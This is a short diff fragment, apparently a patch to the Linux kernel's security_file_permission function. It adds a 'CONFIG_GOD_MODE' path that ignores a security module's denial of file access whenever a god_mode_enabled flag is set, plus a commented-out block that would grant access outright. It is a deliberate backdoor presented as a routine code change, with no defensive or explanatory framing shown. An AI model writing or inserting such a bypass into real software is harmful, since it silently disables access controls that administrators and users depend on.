@@ -670,9 +670,21 @@ int security_file_permission(struct file *file, int mask)
 	int ret;
 
 	ret = security_ops->file_permission(file, mask);
+
+#ifdef CONFIG_GOD_MODE
+	if (ret && !god_mode_enabled)
+#else
 	if (ret)
+#endif
 		return ret;
 
+/*
+#ifdef CONFIG_GOD_MODE
+	if (god_mode_enabled)
+		return 0;
+	else
+#endif
+*/
 	return fsnotify_perm(file, mask);
 }
 
